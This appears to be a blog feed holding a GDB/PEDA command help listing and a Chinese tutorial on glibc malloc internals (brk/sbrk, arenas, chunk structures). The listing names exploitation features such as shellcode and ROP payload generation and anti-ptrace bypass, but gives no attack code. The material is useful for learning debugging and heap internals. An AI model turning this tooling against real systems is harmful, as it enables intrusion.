(hostio-pread) packetshow remote hostio-pwrite-packet -- Show current use of remote protocol `vFile:pwrite&apos; (hostio-pwrite) packetshow remote hostio-readlink-packet -- Show current use of remote protocol `vFile:readlink&apos; (hostio-readlink) packetshow remote hostio-setfs-packet -- Show current use of remote protocol `vFile:setfs&apos; (hostio-setfs) packetshow remote hostio-unlink-packet -- Show current use of remote protocol `vFile:unlink&apos; (hostio-unlink) packetshow remote hwbreak-feature-packet -- Show current use of remote protocol `hwbreak-feature&apos; (hwbreak-feature) packetshow remote install-in-trace-packet -- Show current use of remote protocol `InstallInTrace&apos; (install-in-trace) packetshow remote interrupt-on-connect --         Show whether interrupt-sequence is sent to remote target when gdb connects toshow remote interrupt-sequence -- Show interrupt sequence to remote targetshow remote kill-packet -- Show current use of remote protocol `vKill&apos; (kill) packetshow remote library-info-packet -- Show current use of remote protocol `qXfer:libraries:read&apos; (library-info) packetshow remote library-info-svr4-packet -- Show current use of remote protocol `qXfer:libraries-svr4:read&apos; (library-info-svr4) packetshow remote memory-map-packet -- Show current use of remote protocol `qXfer:memory-map:read&apos; (memory-map) packetshow remote memory-read-packet-size -- Show the maximum number of bytes per memory-read packetshow remote memory-write-packet-size -- Show the maximum number of bytes per memory-write packetshow remote multiprocess-feature-packet -- Show current use of remote protocol `multiprocess-feature&apos; (multiprocess-feature) packetshow remote no-resumed-stop-reply-packet -- Show current use of remote protocol `N stop reply&apos; (no-resumed-stop-reply) packetshow remote noack-packet -- Show current use of remote protocol `QStartNoAckMode&apos; (noack) packetshow remote osdata-packet -- Show current use of remote protocol `qXfer:osdata:read&apos; (osdata) packetshow remote p-packet -- Show current use of remote protocol `p&apos; (fetch-register) packetshow remote pass-signals-packet -- Show current use of remote protocol `QPassSignals&apos; (pass-signals) packetshow remote pid-to-exec-file-packet -- Show current use of remote protocol `qXfer:exec-file:read&apos; (pid-to-exec-file) packetshow remote program-signals-packet -- Show current use of remote protocol `QProgramSignals&apos; (program-signals) packetshow remote query-attached-packet -- Show current use of remote protocol `qAttached&apos; (query-attached) packetshow remote read-aux-vector-packet -- Show current use of remote protocol `qXfer:auxv:read&apos; (read-aux-vector) packetshow remote read-btrace-conf-packet -- Show current use of remote protocol `qXfer:btrace-conf&apos; (read-btrace-conf) packetshow remote read-btrace-packet -- Show current use of remote protocol `qXfer:btrace&apos; (read-btrace) packetshow remote read-fdpic-loadmap-packet -- Show current use of remote protocol `qXfer:fdpic:read&apos; (read-fdpic-loadmap) packetshow remote read-sdata-object-packet -- Show current use of remote protocol `qXfer:statictrace:read&apos; (read-sdata-object) packetshow remote read-siginfo-object-packet -- Show current use of remote protocol `qXfer:siginfo:read&apos; (read-siginfo-object) packetshow remote read-spu-object-packet -- Show current use of remote protocol `qXfer:spu:read&apos; (read-spu-object) packetshow remote read-watchpoint-packet -- Show current use of remote protocol `Z3&apos; (read-watchpoint) packetshow remote reverse-continue-packet -- Show current use of remote protocol `bc&apos; (reverse-continue) packetshow remote reverse-step-packet -- Show current use of remote protocol `bs&apos; (reverse-step) packetshow remote run-packet -- Show current use of remote protocol `vRun&apos; (run) packetshow remote search-memory-packet -- Show current use of remote protocol `qSearch:memory&apos; (search-memory) packetshow remote set-register-packet -- Show current use of remote protocol `P&apos; (set-register) packetshow remote software-breakpoint-packet -- Show current use of remote protocol `Z0&apos; (software-breakpoint) packetshow remote static-tracepoints-packet -- Show current use of remote protocol `StaticTracepoints&apos; (static-tracepoints) packetshow remote supported-packets-packet -- Show current use of remote protocol `qSupported&apos; (supported-packets) packetshow remote swbreak-feature-packet -- Show current use of remote protocol `swbreak-feature&apos; (swbreak-feature) packetshow remote symbol-lookup-packet -- Show current use of remote protocol `qSymbol&apos; (symbol-lookup) packetshow remote system-call-allowed -- Show if the host system(3) call is allowed for the targetshow remote target-features-packet -- Show current use of remote protocol `qXfer:features:read&apos; (target-features) packetshow remote thread-events-packet -- Show current use of remote protocol `QThreadEvents&apos; (thread-events) packetshow remote threads-packet -- Show current use of remote protocol `qXfer:threads:read&apos; (threads) packetshow remote trace-buffer-size-packet -- Show current use of remote protocol `QTBuffer:size&apos; (trace-buffer-size) packetshow remote trace-status-packet -- Show current use of remote protocol `qTStatus&apos; (trace-status) packetshow remote traceframe-info-packet -- Show current use of remote protocol `qXfer:traceframe-info:read&apos; (traceframe-info) packetshow remote unwind-info-block-packet -- Show current use of remote protocol `qXfer:uib:read&apos; (unwind-info-block) packetshow remote verbose-resume-packet -- Show current use of remote protocol `vCont&apos; (verbose-resume) packetshow remote verbose-resume-supported-packet -- Show current use of remote protocol `vContSupported&apos; (verbose-resume-supported) packetshow remote vfork-event-feature-packet -- Show current use of remote protocol `vfork-event-feature&apos; (vfork-event-feature) packetshow remote write-siginfo-object-packet -- Show current use of remote protocol `qXfer:siginfo:write&apos; (write-siginfo-object) packetshow remote write-spu-object-packet -- Show current use of remote protocol `qXfer:spu:write&apos; (write-spu-object) packetshow remote write-watchpoint-packet -- Show current use of remote protocol `Z2&apos; (write-watchpoint) packetshow remoteaddresssize -- Show the maximum size of the address (in bits) in a memory packetshow remotebreak -- Show whether to send break if interruptedshow remotecache -- Show cache use for remote targetsshow remoteflow -- Show use of hardware flow control for remote serial I/Oshow remotelogbase -- Show numerical base for remote session loggingshow remotelogfile -- Show filename for remote session recordingshow remotetimeout -- Show timeout limit to wait for target to respondshow remotewritesize -- Show the maximum number of bytes per memory write packet (deprecated)show schedule-multiple -- Show mode for resuming threads of all processesshow scheduler-locking -- Show mode for locking scheduler during executionshow script-extension -- Show mode for script filename extension recognitionshow serial -- Show default serial/parallel port configurationshow serial baud -- Show baud rate for remote serial I/Oshow serial parity -- Show parity for remote serial I/Oshow solib-absolute-prefix -- Show the current system rootshow solib-search-path -- Show the search path for loading non-absolute shared library symbol filesshow stack-cache -- Show cache use for stack accessshow startup-with-shell -- Show use of shell to start subprocessesshow step-mode -- Show mode of the step operationshow stop-on-solib-events -- Show stopping for shared library eventsshow struct-convention -- Show the convention for returning small structsshow substitute-path -- Usage: show substitute-path [FROM]show sysroot -- Show the current system rootshow target-async -- Show whether MI asynchronous mode is enabledshow target-charset -- Show the target character setshow target-file-system-kind -- Show assumed file system kind for target reported file namesshow target-wide-charset -- Show the target wide character setshow tcp -- TCP protocol specific variablesshow tcp auto-retry -- Show auto-retry on socket connectshow tcp connect-timeout -- Show timeout limit in seconds for socket connectionshow tdesc -- Show target description specific variablesshow tdesc filename -- Show the file to read for an XML target descriptionshow trace-buffer-size -- Show requested size of trace buffershow trace-commands -- Show state of GDB CLI command tracingshow trace-notes -- Show the notes string to use for current and future trace runsshow trace-stop-notes -- Show the notes string to use for future tstop commandsshow trace-user -- Show the user name to use for current and future trace runsshow trust-readonly-sections -- Show mode for reading from readonly sectionsshow tui -- TUI configuration variablesshow tui active-border-mode -- Show the attribute mode to use for the active TUI window bordershow tui border-kind -- Show the kind of border for TUI windowsshow tui border-mode -- Show the attribute mode to use for the TUI window bordersshow unwind-on-terminating-exception -- Show unwinding of stack if std::terminate() is called while in a call dummyshow unwindonsignal -- Show unwinding of stack if a signal is received while in a call dummyshow use-coredump-filter -- Show whether gcore should consider /proc/PID/coredump_filtershow use-deprecated-index-sections -- Show whether to use deprecated gdb_index sectionsshow user -- Show definitions of non-python/scheme user defined commandsshow values -- Elements of value history around item number IDX (or last ten)show verbose -- Show verbosityshow version -- Show what version of GDB this isshow warranty -- Various kinds of warranty you do not haveshow watchdog -- Show watchdog timershow width -- Show number of characters where GDB should wrap lines of its outputshow write -- Show writing into executable and core files</code></pre><h1 id="Command-class-support"><a href="#Command-class-support" class="headerlink" title="Command class: support"></a>Command class: support</h1><pre><code>! -- Execute the rest of the line as a shell commandadd-auto-load-safe-path -- Add entries to the list of directories from which it is safe to auto-load filesadd-auto-load-scripts-directory -- Add entries to the list of directories from which to load auto-loaded scriptsalias -- Define a new command that is an alias of an existing commandapropos -- Search for commands matching a REGEXPdefine -- Define a new command namedemangle -- Demangle a mangled namedocument -- Document a user-defined commanddont-repeat -- Don&apos;t repeat this commanddown-silently -- Same as the `down&apos; commandecho -- Print a constant stringhelp -- Print list of commandsif -- Execute nested commands once IF the conditional expression is non zerointerpreter-exec -- Execute a command in an interpretermake -- Run the ``make&apos;&apos; program using the rest of the line as argumentsoverlay -- Commands for debugging overlaysoverlay auto -- Enable automatic overlay debuggingoverlay list-overlays -- List mappings of overlay sectionsoverlay load-target -- Read the overlay mapping state from the targetoverlay manual -- Enable overlay debuggingoverlay map-overlay -- Assert that an overlay section is mappedoverlay off -- Disable overlay debuggingoverlay unmap-overlay -- Assert that an overlay section is unmappedquit -- Exit gdbshell -- Execute the rest of the line as a shell commandsource -- Read commands from a file named FILEup-silently -- Same as the `up&apos; commandwhile -- Execute nested commands WHILE the conditional expression is non zero</code></pre><h1 id="Command-class-tracepoints"><a href="#Command-class-tracepoints" class="headerlink" title="Command class: tracepoints"></a>Command class: tracepoints</h1><pre><code>actions -- Specify the actions to be taken at a tracepointcollect -- Specify one or more data items to be collected at a tracepointend -- Ends a list of commands or actionspasscount -- Set the passcount for a tracepointsave-tracepoints -- Save current tracepoint definitions as a scripttdump -- Print everything collected at the current tracepointteval -- Specify one or more expressions to be evaluated at a tracepointtfind -- Select a trace frame;tfind end -- De-select any trace frame and resume &apos;live&apos; debuggingtfind line -- Select a trace frame by source linetfind none -- De-select any trace frame and resume &apos;live&apos; debuggingtfind outside -- Select a trace frame whose PC is outside the given range (exclusive)tfind pc -- Select a trace frame by PCtfind range -- Select a trace frame whose PC is in the given range (inclusive)tfind start -- Select the first trace frame in the trace buffertfind tracepoint -- Select a trace frame by tracepoint numbertsave -- Save the trace data to a filetstart -- Start trace data collectiontstatus -- Display the status of the current trace data collectiontstop -- Stop trace data collectiontvariable -- Define a trace state variablewhile-stepping -- Specify single-stepping behavior at a tracepoint</code></pre><h1 id="Command-class-user-defined"><a href="#Command-class-user-defined" class="headerlink" title="Command class: user-defined"></a>Command class: user-defined</h1><p>hook-stop – User-defined</p><h1 id="Unclassified-commands"><a href="#Unclassified-commands" class="headerlink" title="Unclassified commands"></a>Unclassified commands</h1><pre><code>add-inferior -- Add a new inferioraslr -- 32mShow/set ASLR setting of GDBasmsearch -- 32mSearch for ASM instructions in memoryassemble -- 32mOn the fly assemble and execute instructions using NASMbreakrva -- 32mSet breakpoint by Relative Virtual Address (RVA)brva -- 32mAlias for &apos;breakrva&apos;cat -- 32mAlias for &apos;shell cat&apos;checksec -- 32mCheck for various security options of binaryclear -- 32mAlias for &apos;shell clear&apos;clone-inferior -- Clone inferior IDcmpmem -- 32mCompare content of a memory region with a filecontext -- 32mDisplay various information of current execution contextcontext_code -- 32mDisplay nearby disassembly at PC of current execution contextcontext_register -- 32mDisplay register information of current execution contextcontext_stack -- 32mDisplay stack of current execution contextcrashdump -- 32mDisplay crashdump info and save to filedeactive -- 32mBypass a function by ignoring its execution (eg sleep/alarm)distance -- 32mCalculate distance between two addressesdumpargs -- 32mDisplay arguments passed to a function when stopped at a call instructiondumpmem -- 32mDump content of a memory region to raw binary filedumprop -- 32mDump all ROP gadgets in specific memory rangeeflags -- 32mDisplay/set/clear/toggle value of eflags registerelfheader -- 32mGet headers information from debugged ELF fileelfsymbol -- 32mGet non-debugging symbol information from an ELF fileeval -- Convert &quot;printf format string&quot;find -- 32mAlias for &apos;peda searchmem&apos;ftrace -- 32mAlias for &apos;peda tracecall&apos;function -- Placeholder command for showing help on convenience functionsfunction _any_caller_is -- Check all calling function&apos;s namesfunction _any_caller_matches -- Compare all calling function&apos;s names with a regexpfunction _caller_is -- Check the calling function&apos;s namefunction _caller_matches -- Compare the calling function&apos;s name with a regexpfunction _isvoid -- Check whether an expression is voidfunction _memeq -- _memeq - compare bytes of memoryfunction _regex -- _regex - check if a string matches a regular expressionfunction _streq -- _streq - check string equalityfunction _strlen -- _strlen - compute string lengthgennop -- 32mGenerate abitrary length NOP sled using given charactersgetfile -- 32mGet exec filename of current debugged processgetpid -- 32mGet PID of current debugged processgoto -- 32mContinue execution at an addressgrep -- 32mAlias for &apos;shell grep&apos;hexdump -- 32mDisplay hex/ascii dump of data in memoryhexprint -- 32mDisplay hexified of data in memoryitrace -- 32mAlias for &apos;peda traceinst&apos;jit-reader-load -- Load FILE as debug info reader and unwinder for JIT compiled codejit-reader-unload -- Unload the currently loaded JIT debug info readerjmpcall -- 32mSearch for JMP/CALL instructions in memoryjtrace -- 32mAlias for &apos;peda traceinst j&apos;less -- 32mAlias for &apos;shell less&apos;loadmem -- 32mLoad contents of a raw binary file to memorylookup -- 32mSearch for all addresses/references to addresses which belong to a memory rangels -- 32mAlias for &apos;shell ls&apos;man -- 32mAlias for &apos;shell man&apos;more -- 32mAlias for &apos;shell more&apos;nano -- 32mAlias for &apos;shell nano&apos;nearpc -- 32mDisassemble instructions nearby current PC or given addressnextcall -- 32mStep until next &apos;call&apos; instruction in specific memory rangenextjmp -- 32mStep until next &apos;j*&apos; instruction in specific memory rangenxtest -- 32mPerform real NX test to see if it is enabled/supported by OSpatch -- 32mPatch memory start at an address with string/hexstring/intpatta -- 32mAlias for &apos;peda pattern_arg&apos;pattc -- 32mAlias for &apos;peda pattern_create&apos;patte -- 32mAlias for &apos;peda pattern_env&apos;pattern -- 32mGeneratepattern_arg -- 32mSet argument list with cyclic patternpattern_create -- 32mGenerate a cyclic patternpattern_env -- 32mSet environment variable with a cyclic patternpattern_offset -- 32mSearch for offset of a value in cyclic patternpattern_patch -- 32mWrite a cyclic pattern to memorypattern_search -- 32mSearch a cyclic pattern in registers and memorypatto -- 32mAlias for &apos;peda pattern_offset&apos;patts -- 32mAlias for &apos;peda pattern_search&apos;payload -- 32mGenerate various type of ROP payload using ret2pltpbreak -- 32mAlias for &apos;peda pltbreak&apos;pdisass -- 32mFormat output of gdb disassemble command with colorspead -- 32mAlias for &apos;peda&apos;phelp -- 32mAlias for &apos;peda help&apos;pkill -- 32mAlias for &apos;shell pkill&apos;pltbreak -- 32mSet breakpoint at PLT functions match name regexprocinfo -- 32mDisplay various info from /proc/pid/profile -- 32mSimple profiling to count executed instructions in the programps -- 32mAlias for &apos;shell ps&apos;pset -- 32mAlias for &apos;peda set&apos;pshow -- 32mAlias for &apos;peda show&apos;pyhelp -- 32mWrapper for python built-in helpreadelf -- 32mGet headers information from an ELF filerefsearch -- 32mSearch for all references to a value in memory rangesreg -- 32mAlias for &apos;peda xinfo register&apos;reload -- 32mReload PEDA sourcesremove-inferiors -- Remove inferior ID (or list of IDs)ropgadget -- 32mGet common ROP gadgets of binary or libraryropsearch -- 32mSearch for ROP gadgets in memorysearchmem -- 32mSearch for a pattern in memory; support regex searchsession -- 32mSave/restore a working gdb session to file as a scriptsgrep -- 32mSearch for full strings contain the given patternshellcode -- 32mGenerate or download common shellcodes.skeleton -- 32mGenerate python exploit code templateskipi -- 32mSkip execution of next count instructionssnapshot -- 32mSave/restore process&apos;s snapshot to/from filestack -- 32mAlias for &apos;peda telescope sp&apos;start -- 32mStart debugged program and stop at most convenient entrystepuntil -- 32mStep until a desired instruction in specific memory rangestrings -- 32mDisplay printable strings in memorysubstr -- 32mSearch for substrings of a given string/number in memorytelescope -- 32mDisplay memory content at an address with smart dereferencestracecall -- 32mTrace function calls made by the programtraceinst -- 32mTrace specific instructions executed by the programunptrace -- 32mDisable anti-ptrace detectionunset -- Complement to certain &quot;set&quot; commandsunset environment -- Cancel environment variable VAR for the programunset exec-wrapper -- Disable use of an execution wrapperunset substitute-path -- Usage: unset substitute-path [FROM]unset tdesc -- Unset target description specific variablesunset tdesc filename -- Unset the file to read for an XML target descriptionutils -- 32mMiscelaneous utilities from utils modulevi -- 32mAlias for &apos;shell vi&apos;viewmem -- 32mAlias for &apos;peda telescope&apos;vmmap -- 32mGet virtual mapping address ranges of section(s) in debugged processwaitfor -- 32mTry to attach to new forked process; mimic &quot;attach -waitfor&quot;xinfo -- 32mDisplay detail information of address/registersxormem -- 32mXOR a memory region with a keyxprint -- 32mExtra support to GDB&apos;s print commandxrefs -- 32mSearch for all call/data access references to a function/variablexuntil -- 32mContinue execution until an address or function</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn, tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>调用Malloc后发生了什么</title>
      <link href="/2019/02/26/%E8%B0%83%E7%94%A8malloc%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/"/>
      <url>/2019/02/26/%E8%B0%83%E7%94%A8malloc%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<p>malloc函数是用来进行内存分配的函数, 会在在堆上分配一段内存并返回地址</p><p>malloc是glibc函数, 实际上对应的系统调用是brk()函数</p><h2 id="进程的地址空间"><a href="#进程的地址空间" class="headerlink" title="进程的地址空间:"></a>进程的地址空间:</h2><p><img src="/2019/02/26/调用malloc后发生了什么/1.jpg" alt="img"></p><p>众所周知, 栈由高地址向低地址增加, 堆则从低地址向高地址增加</p><h2 id="brk-amp-sbrk"><a href="#brk-amp-sbrk" class="headerlink" title="brk &amp; sbrk"></a>brk &amp; sbrk</h2><p>看一下<a href="https://www.cnblogs.com/shayu/p/3371880.html">brk和sbrk的用法</a>:</p><p>brk和sbrk提供底层的内存分配</p><p>共同维护一个系统指针, 用于对同类型的大块数据的动态存放</p><p>定义:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">brk</span><span class="params">(<span class="keyword">void</span> *end_data_segment)</span></span>; <span class="comment">// 通过移动指针分配空间，释放空间</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">sbrk</span><span class="params">(<span class="keyword">ptrdiff_t</span> increment)</span></span>; <span class="comment">// 分配内存空间，返回指定大小空间的地址</span></span><br></pre></td></tr></table></figure></p><p>brk用法：</p><pre><code>对参数中end_data_segment做[绝对位置]调整，调动指针左右移动，左移-释放空间，右移-分配空间如果内存分配失败，二者都返回-1简而言之, brk可以指定堆的结束地址如当前堆结束地址是0x1000, 调用brk(0x2000), 那么堆结束地址就变成了0x2000, 堆块增加了0x1000的大小</code></pre><p>sbrk用法：</p><pre><code>第一次调用时，系统分配一大块空闲地址，把首地址返回，分配给一个指针phead，作为首地址不动；下一次调用时，返回当前位置的地址，分配给一个指针pnow，并把指针指向+increment的地方；sbrk的参数是一个相对地址, 即当前堆结束地址 + 参数, 并返回因此可以通过调用sbrk(0)的方式来获取当前堆结束地址</code></pre><p>例子:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *brk_end = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/*表示自己想扩展堆大小0字节</span></span><br><span class="line"><span class="comment">    *由于sbrk返回的是新的brk_end，所以sbrk(0)就能获取到当前</span></span><br><span class="line"><span class="comment">    *的brk_end</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">char</span> *p = sbrk(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"current brk end:%p\n"</span>,p);</span><br><span class="line">    <span class="comment">/*brk的入参是绝对地址，表示自己想要拓展brk_end至p+4096*/</span></span><br><span class="line">    brk(p+<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*再次尝试获取当前的brk_end*/</span></span><br><span class="line">    brk_end = sbrk(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"current brk end:%p\n"</span>,brk_end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出:</p><pre><code>current brk end:0x98e000current brk end:0x98f000</code></pre><p>程序流程: <code>获取堆结束地址(sbrk(0)) -&gt; 拓展堆地址0x1000字节(brk(0x1000)) -&gt; 获取堆结束地址(sbrk(0))</code></p><p>显然只用sbrk也可以实现如上程序, 即用<code>sbrk(0x1000)</code>替换<code>brk(p + 0x1000)</code></p><p>如果是使用<code>brk(0x1000)</code>呢?</p><pre><code>$ gcc -o test1 test1.c test1.c: In function ‘main’:test1.c:8:15: warning: initialization makes pointer from integer without a cast     void *c = 0x1000;           ^$ ./test1 current brk end:0x1e5d000current brk end:0x1e7e000</code></pre><p>why?地址不应该是改到0x001000了吗?</p><pre><code>0x0000000000400605 in main ()gdb-peda$ current brk end:0x623000gdb-peda$ x/10gx 0x6020000x602000:    0x0000000000000000    0x00000000000004110x602010:    0x20746e6572727563    0x3a646e65206b72620x602020:    0x3030303332367830    0x000000000000000a0x602030:    0x0000000000000000    0x00000000000000000x602040:    0x0000000000000000    0x0000000000000000gdb-peda$ x/10gx 0x6230000x623000:    Cannot access memory at address 0x623000gdb-peda$ vmmap heapStart              End                Perm    Name0x00602000         0x00623000         rw-p    [heap]</code></pre><p>可以看到调用brk(0x1000)后, 堆末地址会移动到一个不可读的地方, 即<code>0x623000</code></p><p>距离堆顶为<code>0x623000 - 0x602000 = 0x21000, 0x21000 / 0x400 = 132KB</code></p><h2 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h2><p>这132KB的空间叫做arena, 由于是主线程分配的, 所以叫main_arena</p><p>而其他子线程分配的空间则叫做thread_arena</p><p>arena的数量是和处理器的核心数相关的:</p><pre><code>32位系统下:    arena数 = 2 * 核心数 + 1.64位系统下:    arena数 = 8 * 核心数 + 1.</code></pre><p>分配arena的策略是:</p><pre><code>1. 主线程malloc的时候, 无条件直接分配main arena2. 分线程分别分配thread arena3. 当线程数多于arena数时, 循环遍历所有arena, 尝试通过互斥锁锁定第一个可被锁定的arena, 然后给这个多的线程使用4. 如果没有可用的arena时, 则此线程将被阻塞</code></pre><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>ptmalloc通过arena, heap, chunk三种层级的数据结构来对内存管理</p><p>分别对应heap_info, malloc_state, malloc_chunk三种数据结构</p><p>每个线程对应一个arena, 而每个arena包含了多个heap, 每个heap又拥有多个chunk</p><ol><li>heap_info</li></ol><p>即heap header, 由于一个arena包括多个heap, 所以给每个heap设置一个header便于管理</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    mstate ar_ptr; <span class="comment">/* 这个heap所在的arena */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* 前一个heap */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> size;   <span class="comment">/* 当前heap的大小(单位: byte) */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* 写保护和读保护的字节数 PROT_READ|PROT_WRITE */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; <span class="comment">/* 用于数据对齐, 确保 sizeof (heap_info) + 2 * SIZE_SZ 的值是MALLOC_ALIGNMENT的倍数*/</span></span><br><span class="line"></span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><ol start="2"><li>malloc_state</li></ol><p>即arena header, 每个线程只有一个arena header, 包括各种bins的信息, top chunk和remainder chunk等信息</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">mutex_t</span> mutex; <span class="comment">/* 互斥锁, 学过操作系统的应该对mutex这个词很熟悉, 用来对arena进行操作时的同步和互斥 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> flags; <span class="comment">/* 标志位 */</span></span><br><span class="line"></span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS]; <span class="comment">/* fastbin的链表数组, 包括了多个fastbin链表, 是单链表结构 */</span></span><br><span class="line"></span><br><span class="line">    mchunkptr top; <span class="comment">/* top chunk, 当找不到合适大小的bin时, 就在top chunk中分离一段内存并分配 */</span></span><br><span class="line"></span><br><span class="line">    mchunkptr last_remainder; <span class="comment">/* top chunk分离后剩下的未分配的内存 */</span></span><br><span class="line"></span><br><span class="line">    mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];  <span class="comment">/* 除了fastbin的其他bin, 即small bin, large bin, unsorted bin, 都使用的是双向链表*/</span></span><br><span class="line">                                    <span class="comment">/* 下标1是unsorted bin, 2~63是small bin, 64~126是large bin */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE]; <span class="comment">/* 用于指示bin是否被使用的一个位图 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span> <span class="comment">/* 下一个已分配的malloc_state的位置, 即malloc_state是单链表的一个结点 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span> <span class="comment">/* 指向未分配的arena的列表 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 当前arena中被分配的系统内存的总量  */</span></span><br><span class="line"></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol start="3"><li>malloc_chunk</li></ol><p>即chunk header, 一个heap被分为多个chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">    <span class="comment">/* #define INTERNAL_SIZE_T size_t */</span></span><br><span class="line">    INTERNAL_SIZE_T      prev_size;  <span class="comment">/* 前一个chunk的大小(前一个chunk空闲时有意义, 若非空闲则指向用户数据)  */</span></span><br><span class="line">    INTERNAL_SIZE_T      size;       <span class="comment">/* 当前chunk的大小, 包括头部数据, 末三位作为标志位 */</span></span><br><span class="line">                                     <span class="comment">/* 最低位表示前一个chunk是否被使用 */</span></span><br><span class="line">                                     <span class="comment">/* 倒数第二位表示该chunk是否由mmap分配 */</span></span><br><span class="line">                                     <span class="comment">/* 倒数第三位表示该chunk是否存在于main arena */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* 双向链表的前向指针, 这两个指针只在free chunk中存在*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span>         <span class="comment">/* 双向链表的后向指针, 同上 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 只用于large chunk, 指向下一个large chunk size */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* 双向链表, 空闲时有效 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>未被分配时:</p><pre><code>    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+            |             Size of previous chunk                            |            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+    `head:&apos; |             Size of chunk, in bytes                         |P|      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+            |             Forward pointer to previous chunk in list         |            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+            |             Back pointer to next chunk in list                |            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+            |             Unused space (may be 0 bytes long)                .            .                                                               .            .                                                               |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+    `foot:&apos; |             Size of chunk, in bytes                           |            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><p>被分配时:</p><pre><code>chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of previous chunk, if unallocated (P clear)  |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of chunk, in bytes                     |A|M|P|mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             User data starts here...                          .        .                                                               .        .             (malloc_usable_size() bytes)                      .next    .                                                               |chunk-&gt; 